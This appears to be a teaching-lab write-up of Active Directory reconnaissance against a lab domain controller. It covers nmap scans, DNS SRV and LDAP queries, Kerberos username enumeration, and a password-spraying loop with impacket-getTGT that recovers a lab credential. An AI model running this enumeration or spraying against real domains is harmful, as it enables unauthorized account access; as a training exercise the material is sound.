# Windows/AD Enumeration

## Summary

Unauthenticated and low-cost reconnaissance against the Windows Server 2019 domain controller `uow-csf-dc` (`192.168.144.200`), establishing the domain name, DC hostname, reachable AD-related services, and a working domain credential, without assuming any of this in advance. This activity closes the gap between the domain name first surfacing via the Linux DNS zone transfer (`r-17`) and the Kerberoasting exploitation in `e-18`, which otherwise would have opened with a known domain user already in hand.

## Environment

| Item | Value |
|---|---|
| Target | `uow-csf-dc.uow-csf.internal`, `192.168.144.200` |
| Domain | `uow-csf.internal` (NetBIOS `UOWCSF`) |
| Attacker | Kali, `192.168.144.129` |
| Tools | `nmap` (incl. `krb5-enum-users` NSE), `dig`, `ldapsearch`, `nmblookup`, `smbclient`, `rpcclient`, `impacket-getTGT` |
| Wordlists | `/usr/share/wordlists/cav-csf-users.txt` (24 entries), `/usr/share/wordlists/cav-csf-wordlist.txt` (153 entries), see `wordlists-README.md` |

## Lab Dependencies

- Prerequisite: `r-17` (Linux DNS zone transfer), which first disclosed the `uow-csf.internal` zone and the stale `dc01.uow-csf.internal → 192.168.144.200` record. This activity starts from that address with nothing else assumed, not the DC's real hostname, not its AD role in detail, not any credential.
- Starting access: none (unauthenticated).
- Starting account: none.
- Resulting access: a validated domain credential, `analyst` / `CavLab2026!` (the Phase 1 baseline convention, unrevised for this account).
- Feeds into: `e-18` (Kerberoasting against `svc-web`), which requires an authenticated domain principal to request a service ticket for another account's SPN.
- Suggested teaching level: Level 6.

## Reconnaissance

### Host and service confirmation

```bash
nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV -O 192.168.144.200
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-31 04:53 +0100
Nmap scan report for 192.168.144.200
Host is up (0.0011s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 03:54:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: uow-csf.internal, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: uow-csf.internal, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 00:0C:29:79:49:69 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%), Microsoft Windows 10 1803 (90%), Microsoft Windows 10 22H2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: UOW-CSF-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.54 seconds
```

The full AD-typical port set from `w-01`'s own validation checklist is open (Kerberos, LDAP, SMB, kpasswd, Global Catalog), and `-sV` already surfaces the domain name unprompted via the LDAP service banner. `Service Info: Host: UOW-CSF-DC` is the first hint of the DC's real hostname, ahead of any DNS or LDAP query.

### DNS SRV records

```bash
dig @192.168.144.200 -t SRV _ldap._tcp.dc._msdcs.uow-csf.internal
dig @192.168.144.200 -t SRV _kerberos._tcp.uow-csf.internal
```

```text
;; ANSWER SECTION:
_ldap._tcp.dc._msdcs.uow-csf.internal. 600 IN SRV 0 100 389 uow-csf-dc.uow-csf.internal.
;; ADDITIONAL SECTION:
uow-csf-dc.uow-csf.internal. 3600 IN    A       192.168.144.200
```

```text
;; ANSWER SECTION:
_kerberos._tcp.uow-csf.internal. 600 IN SRV     0 100 88 uow-csf-dc.uow-csf.internal.
;; ADDITIONAL SECTION:
uow-csf-dc.uow-csf.internal. 3600 IN    A       192.168.144.200
```

Both SRV records resolve directly to `uow-csf-dc.uow-csf.internal`, confirming the real hostname independently of the stale `dc01` record `r-17` disclosed, and confirming the DC itself, not just the domain, is authoritative for these AD service records.

### LDAP RootDSE

```bash
ldapsearch -x -H ldap://192.168.144.200 -s base -b "" "(objectclass=*)" defaultNamingContext dnsHostName
```

```text
dn:
dnsHostName: uow-csf-dc.uow-csf.internal
defaultNamingContext: DC=uow-csf,DC=internal
result: 0 Success
```

An anonymous, unauthenticated RootDSE query returns the domain's naming context and the DC's FQDN directly, a third independent confirmation of both facts, and demonstrates that RootDSE metadata is readable without a bind even where further directory access is restricted (see below).

### NetBIOS and SMB identity

```bash
nmblookup -A 192.168.144.200
smbclient -L //192.168.144.200/ -N
```

```text
Looking up status of 192.168.144.200
        UOW-CSF-DC      <00> -         B <ACTIVE>
        UOWCSF          <00> - <GROUP> B <ACTIVE>
        UOWCSF          <1c> - <GROUP> B <ACTIVE>
        UOW-CSF-DC      <20> -         B <ACTIVE>
        UOWCSF          <1b> -         B <ACTIVE>
```

```text
Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.144.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

NetBIOS confirms the same hostname (`UOW-CSF-DC`) and domain (`UOWCSF`) a fourth way. Anonymous SMB2 login succeeds but lists zero shares, no anonymous share enumeration is available on this build.

## Enumeration

### Anonymous RPC enumeration: denied

```bash
rpcclient -U "" -N 192.168.144.200 -c enumdomusers
```

```text
result was NT_STATUS_ACCESS_DENIED
```

A negative but legitimate finding, worth keeping deliberately: unlike the Linux Samba misconfiguration (`e-13`), this Windows Server 2019 build does not allow anonymous RPC user enumeration, consistent with default hardening and with Phase 1 carrying no deliberate AD misconfiguration.

### Kerberos username validation

```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='UOW-CSF.INTERNAL',userdb=/usr/share/wordlists/cav-csf-users.txt 192.168.144.200
```

```text
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     administrator@UOW-CSF.INTERNAL
|     analyst@UOW-CSF.INTERNAL
|     skhan@UOW-CSF.INTERNAL
|     backup.operator@UOW-CSF.INTERNAL
|     mpatel@UOW-CSF.INTERNAL
|     helpdesk01@UOW-CSF.INTERNAL
|     jreed@UOW-CSF.INTERNAL
|_    svc-web@UOW-CSF.INTERNAL
```

Kerberos pre-authentication error codes distinguish valid from invalid principals without needing any credential at all. 8 of the 24 candidate usernames in `cav-csf-users.txt` are confirmed real domain accounts; the other 16, generic role names and first-initial-surname guesses, returned no match. This is the same organisationally-informed guessing approach used to build `cav-csf-wordlist.txt`, applied to usernames instead of passwords.

### Credential discovery

With 8 confirmed usernames and no anonymous path to their passwords, the same targeted wordlist is sprayed against a confirmed account:

```bash
for p in $(cat /usr/share/wordlists/cav-csf-wordlist.txt); do
  impacket-getTGT uow-csf.internal/analyst:"$p" -dc-ip 192.168.144.200 2>&1 | grep -q "Saving ticket" && echo "HIT: $p"
done
```

```text
HIT: CavLab2026!
```

`analyst` is still on the Phase 1 baseline convention, unlike `svc-web`, whose password was reset as part of `e-18`. A saved Kerberos ticket from `impacket-getTGT` is definitive proof of a correct password, not an inference from a wordlist match.

## Outcome

Starting from only an IP address and a stale DNS record, this activity independently confirmed: the domain name (`uow-csf.internal`, via `nmap`, DNS SRV, and LDAP RootDSE), the DC's real hostname (`uow-csf-dc`, via DNS SRV, LDAP RootDSE, and NetBIOS), that Kerberos and LDAP are both reachable and responsive, that anonymous RPC/SMB enumeration is not available on this build, and a working domain credential, `analyst` / `CavLab2026!`. That credential is what `e-18` uses to authenticate before requesting a service ticket for `svc-web`'s SPN.

## Teaching Notes

- Domain name and DC hostname were each confirmed by at least three independent methods before being treated as fact, consistent with this project's standing rule of empirical validation over assumption.
- Anonymous RPC enumeration failing here, in contrast to the Linux Samba misconfiguration in `e-13`, is a useful side-by-side teaching point: the same technique against two different services in the same lab, one open, one correctly denied.
- Kerberos pre-authentication error codes (`KDC_ERR_C_PRINCIPAL_UNKNOWN` vs a valid principal requiring pre-auth) allow safe, credential-free username validation regardless of whether any account has pre-auth disabled, distinct from AS-REP roasting itself.
- The credential spray succeeding on the first structured guess (`CavLab2026!`) is the direct, intended consequence of the Phase 1 baseline convention documented in `w-01`, not a coincidence, and is the same convention `wordlists-README.md` deliberately built `cav-csf-wordlist.txt` around.
